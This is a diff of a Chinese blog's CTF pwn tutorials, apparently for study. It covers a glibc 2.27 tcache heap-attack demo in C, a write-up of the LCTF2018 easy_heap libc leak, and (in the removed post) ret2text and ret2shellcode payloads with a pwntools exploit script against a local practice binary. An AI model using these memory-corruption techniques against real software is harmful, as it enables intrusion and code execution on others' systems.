+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g -no-pie hollk.c -o hollk</span></span><br><span class="line"> <span class="number">2</span> <span class="comment">//patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk</span></span><br><span class="line"> <span class="number">3</span> <span class="comment">//patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk</span></span><br><span class="line"> <span class="number">4</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">5</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="number">6</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> <span class="number">7</span> </span><br><span class="line"> <span class="number">8</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">9</span>     <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">10</span>     <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">11</span>     <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"><span class="number">12</span> </span><br><span class="line"><span class="number">13</span>     setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">14</span>     </span><br><span class="line"><span class="number">15</span>     <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line"><span class="number">16</span>     <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="number">17</span>     <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"><span class="number">18</span> </span><br><span class="line"><span class="number">19</span>     stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"><span class="number">20</span> </span><br><span class="line"><span class="number">21</span>     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">22</span>         chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">23</span>     &#125;</span><br><span class="line"><span class="number">24</span> </span><br><span class="line"><span class="number">25</span>     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">26</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line"><span class="number">27</span>     &#125;</span><br><span class="line"><span class="number">28</span>     </span><br><span class="line"><span class="number">29</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="number">30</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="number">31</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"><span class="number">32</span>     </span><br><span class="line"><span class="number">33</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line"><span class="number">34</span>     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">35</span>     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">36</span>     </span><br><span class="line"><span class="number">37</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line"><span class="number">38</span>     <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"><span class="number">39</span> </span><br><span class="line"><span class="number">40</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">41</span> </span><br><span class="line"><span class="number">42</span>     <span class="built_in">printf</span>(<span class="string">&quot;target now: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"><span class="number">43</span> </span><br><span class="line"><span class="number">44</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"><span class="number">45</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">46</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里具体的根据这个案例来分析这种漏洞的利用（注意要使用libc.2.27来编译这个程序），</p>
+<p><strong>LCTF2018 PWN easy_heap</strong></p>
+<p>这个方向在wiki上的第一道题就是这个，这是一个极好的题目，其中对于如何泄露libc的手法很是奇妙，很值得仔细写一写。</p>
+<p>先感谢hollk大佬的文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113697892">（补题）LCTF2018 PWN easy_heap超详细讲解_lctftk-CSDN博客</a>写的很详细，膜拜大佬。</p>
+<p>这道题的整体逻辑还是比较简单的，就是可以申请10个chunk，这10个chunk的大小固定，都为0xf8（数据段大小）。然后这10个chunk的指针和大小都会被记录进最开始的一个chunk中，然后我们可以对这10个chun进行，free，puts，其中的内容在最开始申请的时候就会被输入其中，后期不能更改。</p>
+<p>整体看完程序会发现漏洞就一个，在chunk申请的时候能输入多少多少数据是由我们输入的大小决定的，这里由于我们这个chunk的大小为固定的0xf8，我们能输入的数据的最大大小也为0xf8，然后这里有个很大的问题在于用于向chunk读入的内容的函数，使用的是个循环函数，这里只要我们输入的大小为0xf8这个循环就会出现一个类似于<code>off-by-one</code>漏洞的<code>null-byte-overflow</code>漏洞(wiki上这么叫，虽然我感觉没什么差别)，这里会对下一个chunk的size的最后两个位址覆盖为<code>\x00</code>，这里覆盖的这个位置正好是chunk中由于检测上一个chunk是否为free chunk的inuse标志位，当程序检测到这个chunk的上一个chunk为free chunk时，这个位址的值为0，否则为1。</p>
+<p>然后就会发现，好了没有其他漏洞。是的，这道题的漏洞就只有这一个可以覆盖inuse标志位为0的漏洞，那么现在我们就要想办法看看能不呢使用什么方法来让我们能在程序中出现一个chunk既能有指针能调用，同时自身又在unsorted bin中，这样我们便可以直接通过打印这个chunk从而实现得到libc地址。</p>
+<p>这里有一个需要先讲的知识点那就是当我们将数个相同的大小并且并且相邻的chunk被挂入unsorted bin中时，程序会为了后面的malloc方便会直接将这几个chunk在unsorted bin中合并成一个大的chunk，同时对于其中的之前的chunk会对其控制字段进行一定的改变，将其中的prev size会更具前面的free chunk的大小修改，同时size的inuse标志为0。</p>
+<p>这里就有一个很大的问题如果我们在后期能将这个合并的大chunk，在后期将第一个chunk挂入unsorted bin中，同时有将最后一个chunk挂入其中，并修改其中的所有chunk1的控制字段与合并时相同（prev size和size的内容相同）程序会默认在unsorted bin中形成之前的那个大chunk，从而使我能对中间的那个chunk进行Double Free和泄露libc地址。</p>
+<p><strong>以下由于在程序中chunk的次序是由0开始，所以这里要注意下面的第几个chunk是从0开始数的第几，不是从1开始，要注意这一点避免认错chunk</strong></p>
+<ol>
+<li><p>申请10个chunk</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70-17188743446133.png" alt="在这里插入图片描述"></p>
+</li>
+<li><p>将前6个chunk和第9个chunk，free进入tcachebin中填满，再将第6到第8个chunk，free进入unsorted bin中。</p>
+<p>这里678这3个chunk被free到unsorted bin会合并为一个大chunk，使得chunk7和chunk8的prve size 和size的值分别被修改为0x100，0x100和0x200，0x100。chunk6的size为0x300。<img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+</li>
+<li><p>在向程序申请10个chunk，使得chunk成新的排列。</p>
+<p><img src="/2024/05/27/%E5%A0%86%E5%9F%BA%E7%A1%80%E9%A2%98%E8%A7%A3%E6%B3%95%E5%8F%8Awp/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3,size_16,color_FFFFFF,t_70-17188743583236.png" alt="在这里插入图片描述"></p>
+</li>
+<li><p>在free前6个chunk和第7个chunk以填满tcachebin（这里最后一个填chunk8，是为了在后面可以直接申请这个从而覆盖chunk9的inuse标志位为0，让程序以为chunk8也是free chunk），再将chunk7也free掉使其进入unsorted bin，同时这样也能修改chunk7的inuse标志位也为0，</p>
+</li>
+<li><p>再向程序malloc一个chunk，程序会将上一个中chunk8拿给我们使用（chunk8在tcachebin的第一位，第一个分配）这里直接使用漏洞修改chunk9中的inuse标志位，使其认为上一个chunk为free。</p>
+</li>
+<li><p>free掉chunk6的chunk用于填满tcachebin中刚刚分配的那一个，然后在free掉chunk9的chunk。</p>
+<p>这里由于之前我们通过第二步的3个chunk的合并，使得上面第3步后的chunk789的chunk中的prev size和size都被修改了。然后在第4步时我们又将chunk7 free进unsorted bin，这样使得chunk8中的size的inuse标志位为0。此时这两个chunk的控制字段与第2步的相同了，此时我们在free掉chunk9的chunk，正常情况下由于chunk8在第5步时不是free chunk了，所以这里chunk9的size的inuse标志位为1。即使我们在这里free了chunk9也不会有什么问题发生，但是由于我们在第5步时将chunk9的size的inuse标志位覆盖为0了，于是这里我们在将chunk9 free时就会使程序中的unsorted bin中又出现第2步的3个合并的大chunk，但是chunk8却在第5步时被程序拿给我们了。</p>
+</li>
+<li><p>将tcachebin中的7个chunk和unsorted bin中的第一个chunk7的chunk都malloc出来那此在程序中。unsorted bin的第一个hunk便是以第3歩中的chunk8为起始地址，但是在新的chunk0中记录的正好就是chunk8的指针。</p>
+</li>
+<li><p>打印chunk0的内容，从而得到libc的地址。</p>
+</li>
+</ol>
+<p>以上就是这道题中关于libc的泄露，只是基本步骤，具体的有时间再仔细分析一下，这个方法还是很奇妙的，利用到unsorted bin中chunk的合并，从而使的程序中误认为有大free chunk的出现。</p>
+<p>这道题我写的比较简陋，只是为了我自己方便研究这个方法，更好的推荐看这个地方<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#_3">Tcache attack - CTF Wiki (ctf-wiki.org)</a>和上面提到的大佬的博客讲的更加直观与详细。</p>
 
       
     </div>
@@ -1750,6 +1828,14 @@
 <p>如果我们要修改得时date段的数据，那便要malloc的长度将使一个负数(date段的数据在chunk的下方)，由于我们在之前的覆盖中已经将top chunk中的size的大小表为整个地址空间，于是我们在malloc一个负数时，程序会将top chunk的起始地址向下移动这个负数的长度。然后我们再malloc一个正数时，程序便会从我们刚刚移动过的top chunk的头地址可是分配一个相应大小的chunk以供使用。</p>
 <p>因此我们只在栈溢出后malloc一个负数，其大小就是从top chunk的起始地址到要修改的date段地址的下两个字节的距离的负数（两个字节作为下个chunk的前两个控制字段），然后再malloc一个正数的chunk，输入数据便可以达到我们的目的。</p>
 <p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240516175155536.png" alt="image-20240516175155536"></p>
+<p><strong>有关于各个bin的chunk进入与分配结构</strong></p>
+<p><em>tcachebins</em>:</p>
+<p>先进后出，后进先出</p>
+<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240620150551052.png" alt="image-20240620150551052"></p>
+<h6 id="分配的时候将从chunk4开始分配依次分配到chunk1。"><a href="#分配的时候将从chunk4开始分配依次分配到chunk1。" class="headerlink" title="分配的时候将从chunk4开始分配依次分配到chunk1。"></a>分配的时候将从chunk4开始分配依次分配到chunk1。</h6><p><em>unsortedbin</em>：</p>
+<p>先进先出，后进后出。</p>
+<p><img src="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/image-20240620150930731.png" alt="image-20240620150930731"></p>
+<p>分配的时候从chunk1开始依次分配到chunk4。（要注意这几个chunk如果大小相同，并且相临，那么进入到unsortedbin后会直接合并为一个大chunk，然后在要分配时直接切割这个大chunk）</p>
 
       
     </div>
@@ -2376,162 +2462,6 @@
 
 
   
-    <article id="post-wp" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/03/27/wp/" class="article-date">
-  	<time datetime="2024-03-27T12:06:41.000Z" itemprop="datePublished">2024-03-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/03/27/wp/">
-        pwn 一些题详解
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#ret2text</p>
-<p>主要分为32位的和64位的不同程序，在做法是有不同的对应方法与</p>
-<p>在一开始都要先在linux中先确定程序使用了那些保护方式与结构类型</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件名</span><br></pre></td></tr></table></figure>
-<p>![屏幕截图 2023-11-28 173641](wp&#x2F;屏幕截图 2023-11-28 173641-17115444455564.png)</p>
-<p>![屏幕截图 2023-11-28 173737](wp&#x2F;屏幕截图 2023-11-28 173737.png)</p>
-<p><em>1</em>，无论是32位还是64位都要首先确定栈溢出时要填充多少个垃圾数据，有两种方法，ida和动调</p>
-<p>ida（在特定的环境下可能不对以动调的为主）：直接看所要溢出的那个栈在ida上与ebp的距离就是我们一开始要填从的数据的大小，注意在ida上显示的是16进制的数，在写脚本是要转化为10进制的数才能正确，如图要向buf中填充0x12（18）的数据才算覆盖到ebp的位置<br>![屏幕截图 2023-11-27 204046][wp&#x2F;屏幕截图 2023-11-27 204046.png]![屏幕截图 2023-11-27 204046](wp&#x2F;屏幕截图 2023-11-27 204046.png)</p>
-<p>动调：gdb+可执行文件的名称，在运行到输入数据是输入较亮眼的数据，在之后看esp和ebp的距离，是为要注入的数据长。</p>
-<p>现在注入的数据到达ebp所指向的地方但并没用完，由于栈的特点此时我们<br>还需要向其中再注入一段数据用于覆盖ebp所指向的地址，并且这段数据在不同系统中有不同的长度，在64位系统中要输入8个长度的数据，在32位系统中要输如4个长度的数据<br>以上的垃圾数据长度为一个字节（一个大写字母），用如下传递</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*长度的大小</span><br></pre></td></tr></table></figure>
-
-<p>在确定垃圾数据的长度后在注入的数据便是之后程序要跳转执行的地方，在当下的情况下要让程序能执行system(&#x2F;bin&#x2F;sh)以获得控制权，如果在程序中有这个完整的函数，则在垃圾数据之后直接输入该函数的地址跳转到那执行就行，无论是32位还是64位都这样。函数的地址在ida中获得，用如下传递</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(<span class="number">0</span>x地址数字）用于<span class="number">32</span>位系统</span><br><span class="line">p64(<span class="number">0</span>x地址数据)用于<span class="number">64</span>位系统</span><br></pre></td></tr></table></figure>
-
-<p><strong>函数传参</strong><br>在很多情况下程序中并不会直接有system(&#x2F;bin&#x2F;sh)这个函数，而是将这system和&#x2F;bin&#x2F;sh放在不同的地方，需要我们将这两个同过地址的连在一起，用于执行，而此处32为系统与64为系统便是完全不同的方式进行，分开论述。</p>
-<p><em>32位系统</em>pit<br>在将垃圾数据输入进去之后直接输入到system函所在的地址（切记要输入的是该函数在plt段的地址，不能是text段的地址）<br>此时当程序执行到这里时会直接进入该函数的内部此时我们只要再输入字符串（&#x2F;bin&#x2F;sh）的位置程序便会执行该函数，但在输入字符串之前还要输入一个0</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p32(plt段的system的地址)</span><br><span class="line">+p32(<span class="number">0</span>)+p32(.data段的/bin/sh的地址)</span><br></pre></td></tr></table></figure>
-<p>关于0的加入：<br>对于本题的函数传参，我们的栈帧构造初步想法如图</p>
-<p>ebp	‘aaaa’<br>r	return to func<br>参数一	“&#x2F;bin&#x2F;sh”<br>输入适量垃圾填充 padding * b ‘a’<br>覆盖返回地址指向func函数 p32(ret_addr)<br>参数”&#x2F;bin&#x2F;sh”地址<br>则payload &#x3D;  padding*b’a’ + p32(ret_addr)  + p32(sh_addr)</p>
-<p>然而这样的脚本在攻击时会出错。原因在于：</p>
-<p>正常的函数调用call来达到push eip；jmp的作用，经过初步payload构造的攻击如下图所示，是通过覆盖return达到jmp的作用的，并没有像call一样push eip到栈中。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/4234700732.png" alt="38e10a9971624ec18cd2d549954ca408.png"><img src="/2024/03/27/wp/38e10a9971624ec18cd2d549954ca408.png" alt="38e10a9971624ec18cd2d549954ca408"><br> 故而ret执行后，ebp后为我们输入的参数而非eip原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用ret2text覆盖pwn题时候，需要自行加入一行栈帧的填充。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/1648215160.png" alt="701953734d034bbe98efac9dc5c6f836.png"><img src="/2024/03/27/wp/701953734d034bbe98efac9dc5c6f836.png" alt="701953734d034bbe98efac9dc5c6f836"><br><em>64位系统</em><br>在64位的中在将垃圾数据写入之后，我们要将&#x2F;bin&#x2F;sh这段数据先写入到一个寄存器中然后将这个寄存器导入到函数中程序才能·执行<br>于是要做的第一步就是找到一个寄存器并修改其中的值，使用</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://blog.forevers.love/usr/uploads/2023/11/803004082.png" alt="屏幕截图 2023-11-28 195354.png">![屏幕截图 2023-11-28 195354](wp&#x2F;屏幕截图 2023-11-28 195354.png)<br>通过这个我们可以找的程序中可以给我们使用·修改寄存器的命令的地址<br>在这里我们只用传一段函数于是只要用pop rdi；ret一个指令将rdi中的值修改，然后便是在栈中放入‘bin&#x2F;sh’经由pop提交给rdi，最后便是填system的地址（在这里要填入的不能是plt段的system函数的地址，要填的是.data段中的call system的地址，因为在之前将&#x2F;bin&#x2F;sh的地址填入其中从而导入rdi中，如果要rdi中的数据能进入system中则要用call system，将rdi中值导入system然后在执行该函数)</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p64(pop|ret的地址)+</span><br><span class="line">p64(.data段中的/bin/sh的地址)+p64(.data段中的call system的地址)</span><br></pre></td></tr></table></figure>
-
-<p>#ret2shellcode<br>在这一类题中不会出现system和&#x2F;bin&#x2F;sh这种直接可以用来控制的函数，但程序中有一部分是可读可写可执行的部分，这一部分在程序中是很危险的一部分，一旦出现这种地方，同时含有栈溢出，便可以在通过栈溢出之后使程序跳到那部分可读可写可执行的部分，我们在往里面输入我们shellcode（意为一段恶意程序，通过执行这一段恶意程序，获得控制权）</p>
-<p>关于可读可写可执行段的查找可以在gdb调式程序的过程中用vmmap指令查找<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3104877570.png" alt="屏幕截图 2023-11-30 143610.png">![屏幕截图 2023-11-30 143610](wp&#x2F;屏幕截图 2023-11-30 143610.png)<br>如图便可以查找到从0x601000到0x602000是可读可写可执行（一下称为rwx)的程序，我们便可以将shellcode写入到这段程序</p>
-<p>有的时候这个程序不一定在一开始写的时候便有rwx段程序，但在执行时会因为那个指令出现rwx段程序，如</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br></pre></td></tr></table></figure>
-<p>这个指令将0x601000之后的0x100段数据都改为rwx程序于是我们便可以想这段之中写入我们的shellcode，在通过栈溢出使他执行这一段程序。</p>
-<p><strong>shellcode</strong><br>一段恶意程序，可以在pwntools中获得比较简单的一些，执行</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.sh()<span class="comment">//默认为32位的如果要64位执行下面这个</span></span><br><span class="line">shellcraft.amd64.sh()<span class="comment">//</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://blog.forevers.love/usr/uploads/2023/11/2163217567.png" alt="屏幕截图 2023-11-30 145900.png">![屏幕截图 2023-11-30 145900](wp&#x2F;屏幕截图 2023-11-30 145900.png)<br>此时我们获得不过是汇编语言不能直接传入程序中，必须将它换为机器语言传入才能穿入成功</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">这样输出的便是机器语言的shellcode，直接传入其中便可以使用</span><br></pre></td></tr></table></figure>
-<p>在64位的是可能会因为其环境默认为32位的而出现问题可以通过如下修改<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3832015840.png" alt="屏幕截图 2023-11-30 150708.png">![屏幕截图 2023-11-30 150708](wp&#x2F;屏幕截图 2023-11-30 150708.png)</p>
-<p><strong>例题</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc poc.c -o poc -no-pie -fno-stack-protector</span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">initt</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">		setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">		<span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pwnn</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;please pwn me!!!&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InputName</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;inputs you name&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,shellcode,<span class="number">100</span>);</span><br><span class="line">		mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	initt();</span><br><span class="line">	InputName();</span><br><span class="line">	pwnn();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在这段程序中先执行InputName函数，在这个函数中，同构read向shellcode中可以输入最长100字节的数据，然后我们会发现他将0x601000之后100的数据改为rwx段，在ida中正好可以看到shellcode段的数据刚好在这其中，我们便可以通过这个向其中输入shellcode，在pwnn这个函数中正好有栈溢出的存在，<br>于是便可以先通过InputName函数输入shellcode然后再pwnn中栈溢出指向<br>shellcode的地址<br>攻击如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span><span class="comment">//更改环境</span></span><br><span class="line">bss=<span class="number">0x6010A0</span><span class="comment">//shellcode的地址</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(bss)<span class="comment">//溢出并指向地址</span></span><br><span class="line">binsh=<span class="keyword">asm</span>(shellcraft.amd64.sh())构建shellcode</span><br><span class="line">io.send(binsh)<span class="comment">//先将shellcode传入rwx段中</span></span><br><span class="line">io.recv()<span class="comment">//由于是两段输入中间一个做间隔</span></span><br><span class="line">io.send(payload)<span class="comment">//进行栈溢出</span></span><br><span class="line">io.interactive()<span class="comment">//交互</span></span><br></pre></td></tr></table></figure>
-<p>在这一类题中有一个必须注意的事，shellcraft注入的地方最好是bss区，在这题中便是注入到bss区中的，虽然可以注入到栈上但栈上的保护过多最好不要注入到栈中</p>
-<p>#ret2syscall<br>来吧趁今天有点时间把欠了一个星期的博客给补了<br>syscall相当于是一个系统中的命令，可以在与其他寄存器相配合的情况下完成系统调令，在程序没有system和&#x2F;bin&#x2F;sh时使用。<br>在系统中要取得控制权常用的方法是执行system（&#x2F;bin&#x2F;sh）指令，但很多情况下程序是一般不会有这个指令的，此时便可以看是不是可以通过向rwx段注入shellcode来获得控制权，但程序一般也不会有这种地方此时便可以开始考虑ret2syscall的方法，但这种方法夜有很大的局限性，一般只能在静态链接中使用，很少在动态链接中使用，虽然也不是不可以（之后便会讲一题用动态链接的题虽然在一定程度上那题可以算ret2csu的题但本质上还算用syscall可以做的题），</p>
-<p>ret2syscall的本质就是让部分寄存器中的值变为特殊值从而使程序执行一个系统调令</p>
